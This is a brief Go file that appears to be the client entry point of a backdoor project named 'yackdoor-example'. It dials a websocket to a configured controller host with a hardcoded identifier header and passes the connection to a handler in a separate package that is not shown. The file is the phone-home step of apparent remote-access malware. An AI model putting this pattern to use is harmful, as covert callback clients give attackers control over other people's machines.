package main

import (
	"log"
	"net/http"
	"net/url"

	"github.com/bruh-boys/yackdoor-example/Communicate"
	"golang.org/x/net/websocket"
)

func main() {
	origin, _ := url.Parse(Communicate.Origin)
	url, _ := url.Parse(Communicate.Url)

	conn, err := websocket.DialConfig(&websocket.Config{
		Origin:    origin,
		Location:  url,
		Version:   websocket.ProtocolVersionHybi13,
		TlsConfig: nil,
		Header: http.Header{
			"id": {"cum"}, // later i will use a token btw
		},
	})
	if err != nil {
		log.Fatal(err)
	}
	Communicate.StartEverything(conn)
}
